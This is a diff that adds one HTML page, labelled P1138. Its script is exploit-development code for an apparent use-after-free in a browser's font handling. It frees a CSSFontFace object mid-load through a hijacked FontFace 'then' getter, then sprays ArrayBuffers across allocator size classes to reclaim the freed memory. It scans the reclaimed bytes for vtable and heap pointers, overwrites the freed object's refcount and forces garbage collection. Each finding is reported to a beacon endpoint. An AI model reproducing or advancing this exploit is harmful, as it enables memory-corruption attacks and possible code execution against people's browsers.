@@ -1,0 +1,198 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1138</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+
+log('phase','=== P1138: GC DEREF + COMPREHENSIVE SIZE SWEEP ===');
+log('info','A: Sweep ALL bmalloc size classes for CSSFontFaceSource vtable');
+log('info','B: Test GC deref path by monitoring refcount change');
+B('P1138-START','t='+Date.now());
+
+var r=Date.now()%100000;
+var uafHit=false;
+// ALL bmalloc size classes 16-512 + extras
+var SIZES=[16,32,48,64,80,96,112,128,160,192,224,256,320,384,448,512];
+var N=30;
+var allSpray={};
+var uafView=null;
+var uafIdx=-1;
+
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:g"+r+";src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+// Store ff in a variable we can null later for GC test
+var ff=new FontFace('h'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);void ff.loaded;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(uafHit)return undefined;uafHit=true;
+  if(st.parentNode)st.remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  // CSSFontFace freed NOW — spray ALL sizes
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    allSpray[sz]=[];
+    for(var k=0;k<N;k++){
+      allSpray[sz].push(new ArrayBuffer(sz));
+    }
+  }
+  try{document.fonts.check('1em g'+r);}catch(e){}
+  return undefined;
+},set:function(){}});
+
+document.fonts.load('1em h'+r+', g'+r,'AB').then(function(){},function(){});
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  if(!allSpray[192]){B('P1138-MISS','no_uaf');log('fail','No UAF');return;}
+
+  // ===== PART A: Size class sweep =====
+  log('info','Part A: Scanning all size classes...');
+  var nzBySize={};
+  var vtableFound=[];
+
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    var bufs=allSpray[sz];
+    var nzList=[];
+
+    for(var k=0;k<bufs.length;k++){
+      var v=new BigUint64Array(bufs[k]);
+      for(var q=0;q<v.length;q++){
+        if(v[q]!==0n){
+          var val=v[q];
+          var hi=Number(val>>32n);
+          var aligned=(val&7n)===0n;
+          var tag=(val===1n)?'RC':(hi>=0x10&&hi<=0xFF)?'HP':
+            (aligned&&hi>=0x100&&hi<0xFFFF)?'VT?':(hi===0&&Number(val)<0x10000)?'SM':'?';
+
+          nzList.push({k:k,q:q,val:hex64(val),tag:tag});
+
+          // CSSFontFace identification (192-byte, q0=1, q11+q13 heap)
+          if(sz===192&&q===0&&val===1n&&v.length>=14&&v[11]!==0n){
+            uafView=v;
+            uafIdx=k;
+          }
+
+          // VTABLE candidate: q0, aligned, in code range
+          if(q===0&&aligned&&(tag==='VT?')){
+            vtableFound.push({sz:sz,k:k,val:hex64(val)});
+            log('win','VTABLE CANDIDATE! sz='+sz+' buf['+k+'] q0='+hex64(val));
+          }
+          break;
+        }
+      }
+    }
+
+    if(nzList.length>0){
+      nzBySize[sz]=nzList;
+      B('P1138-SZ-'+sz,'hits='+nzList.length+'|'+nzList.slice(0,3).map(function(e){return e.q+':'+e.val+'('+e.tag+')';}).join(','));
+      log('ptr','sz='+sz+': '+nzList.length+' non-zero: '+nzList.slice(0,3).map(function(e){return 'q'+e.q+'='+e.val;}).join(' '));
+    }
+  }
+
+  // Report vtable candidates
+  B('P1138-VT','count='+vtableFound.length);
+  for(var i=0;i<vtableFound.length;i++){
+    B('P1138-VT-'+i,JSON.stringify(vtableFound[i]));
+  }
+
+  // ===== PART B: GC deref test =====
+  log('info','Part B: Testing GC deref path...');
+
+  if(!uafView){
+    B('P1138-GC','no_uaf_view');
+    log('fail','No UAF window for GC test');
+    finishReport();
+    return;
+  }
+
+  var origQ0=uafView[0];
+  var origQ11=uafView[11];
+  log('ok','UAF window: q0='+hex64(origQ0)+' q11='+hex64(origQ11));
+  B('P1138-CFF','q0='+hex64(origQ0)+'|q11='+hex64(origQ11)+'|q13='+hex64(uafView[13]));
+
+  // Set refcount to 2 (so deref makes it 1, not 0 — avoids crash from destructor)
+  uafView[0]=2n;
+  log('info','Set q0=2 (safe deref: 2->1, no delete)');
+  B('P1138-SET','q0=2');
+
+  // Snapshot all 24 qwords for before/after comparison
+  var before=[];
+  for(var q=0;q<uafView.length;q++)before.push(uafView[q]);
+
+  // Release FontFace reference
+  ff=null;
+
+  // Force GC with allocation pressure
+  for(var gc=0;gc<10;gc++){
+    var trash=[];
+    for(var i=0;i<5000;i++){
+      trash.push({a:i,b:'x'.repeat(16)});
+    }
+    trash=null;
+  }
+
+  // Check after GC
+  setTimeout(function(){
+    var changes=[];
+    for(var q=0;q<uafView.length;q++){
+      if(uafView[q]!==before[q]){
+        changes.push('q'+q+':'+hex64(before[q])+'->'+hex64(uafView[q]));
+      }
+    }
+
+    var q0Now=uafView[0];
+    var derefHappened=q0Now!==2n;
+
+    B('P1138-GC-RESULT','q0_now='+hex64(q0Now)+'|deref='+derefHappened+'|changes='+changes.length);
+
+    if(derefHappened){
+      log('win','GC DEREF CONFIRMED! q0: 2 -> '+hex64(q0Now));
+      log('info','Changes: '+changes.join(', '));
+      B('P1138-GC-CHANGES',changes.join('|'));
+    }else{
+      log('info','q0 still 2 — GC did not call deref yet');
+
+      // Try harder GC
+      log('info','Trying harder GC pressure...');
+      for(var gc2=0;gc2<20;gc2++){
+        var t2=[];
+        for(var i=0;i<10000;i++)t2.push(new ArrayBuffer(64));
+        t2=null;
+      }
+
+      // Re-check
+      var q0After2=uafView[0];
+      var changes2=[];
+      for(var q=0;q<uafView.length;q++){
+        if(uafView[q]!==before[q])changes2.push('q'+q+':'+hex64(before[q])+'->'+hex64(uafView[q]));
+      }
+
+      B('P1138-GC2','q0='+hex64(q0After2)+'|changes='+changes2.length);
+      if(q0After2!==2n){
+        log('win','GC DEREF (round 2)! q0: 2 -> '+hex64(q0After2));
+        B('P1138-GC2-CHANGES',changes2.join('|'));
+      }else{
+        log('info','Still q0=2 after heavy GC — deref not triggered');
+      }
+    }
+
+    finishReport();
+  },100);
+
+  function finishReport(){
+    var sizeKeys=[];
+    for(var sz in nzBySize)sizeKeys.push(sz+'='+nzBySize[sz].length);
+    B('P1138-DONE','sizes_hit='+sizeKeys.join(',')+
+      '|vtable='+vtableFound.length+
+      '|q0_final='+hex64(uafView?uafView[0]:0n));
+    log('phase','=== DONE ===');
+  }
+},10);
+</script></body></html>
